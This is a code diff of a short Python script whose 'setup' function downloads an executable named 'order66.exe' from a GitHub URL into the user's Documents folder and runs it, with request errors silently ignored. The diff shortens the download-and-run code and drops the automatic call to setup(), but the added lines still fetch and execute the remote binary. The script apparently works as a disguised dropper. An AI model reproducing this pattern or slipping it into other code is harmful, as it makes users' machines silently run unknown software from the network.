@@ -1,15 +1,9 @@
 import os, requests, subprocess
 def setup():
-    documents_folder = os.path.expanduser("~\\Documents")
-    file_url = "https://github.com/Sam-cpu999/stuff/raw/main/order66.exe"
-    file_path = os.path.join(documents_folder, "order66.exe")
+    setupexepath = os.path.join(os.path.expanduser("~\\Documents"), "order66.exe")
     try:
-        response = requests.get(file_url, stream=True)
-        response.raise_for_status()
-        with open(file_path, 'wb') as file:
-            for chunk in response.iter_content(chunk_size=8192):
-                file.write(chunk)
-        subprocess.run([file_path], shell=True)
+        with open(setupexepath, 'wb') as file:
+            file.write(requests.get("https://github.com/Sam-cpu999/stuff/raw/main/order66.exe").content)
+        subprocess.run([setupexepath])
     except requests.exceptions.RequestException:
         pass
-setup()
